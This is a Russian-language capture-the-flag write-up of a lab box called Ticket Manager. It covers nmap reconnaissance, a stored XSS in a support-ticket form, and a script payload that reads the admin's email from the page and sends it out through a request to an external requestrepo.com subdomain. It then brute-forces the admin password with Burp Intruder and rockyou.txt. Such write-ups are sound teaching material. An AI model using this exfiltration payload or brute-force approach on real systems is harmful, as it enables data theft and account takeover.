# Write-up: Ticket Manager (XSS → Account Takeover)

## Recon

Начинаем с базового сканирования:

```bash
sudo nmap -sS -sV -sC <TARGET-IP>
```

Результат:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Ticket Manager > Home
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

На веб-сервере встречаем форму регистрации и входа. Регистрируем свой аккаунт:

![Регистрация](img/Pasted_image_20261106231307.png)

В личном кабинете можно создать тикет для поддержки:

![Создание тикета](img/Pasted_image_20261106231337.png)

Создавая тикет, замечаем, что введённый текст попадает прямо в HTML-код страницы:

![Текст в HTML](img/Pasted_image_20261106203141.png)

Это позволяет проверить XSS:

```html
</textarea><script>alert(1)</script><textarea>
```

![XSS сработал](img/Pasted_image_20261106203305.png)

XSS сработал — двигаемся дальше.

## Кража email через XSS

Используем **requestrepo.com**, чтобы получить обратный запрос со стороны ЛК техподдержки и вытащить email администратора.

Payload:

```html
</textarea><script>
var email = document.getElementById("email").innerText;
email = email.replace("@", "0").replace(".", "x").trim();
new Image().src = "http://" + email + ".SUB_FROM_SITE";
</script><textarea>
```

 **requestrepo.com**:

![Requestrepo настройка](img/Pasted_image_20261106232058.png)

Получаем входящий запрос:

![Входящий запрос](img/Pasted_image_20261106204500.png)

Email техподдержки:

```text
adminaccount@itsupport.thm
```

## Подбор пароля

Берём запрос логина в Burp Suite и отправляем его в Intruder. В качестве словаря использую `rockyou.txt`.

Получаем запрос с кодом `302` — успешный вход:

![Успешный логин](img/Pasted_image_20261106210213.png)

## Флаг

Заходим в аккаунт администратора, открываем первый тикет и забираем флаг:

![Флаг](img/Pasted_image_20261106210333.png)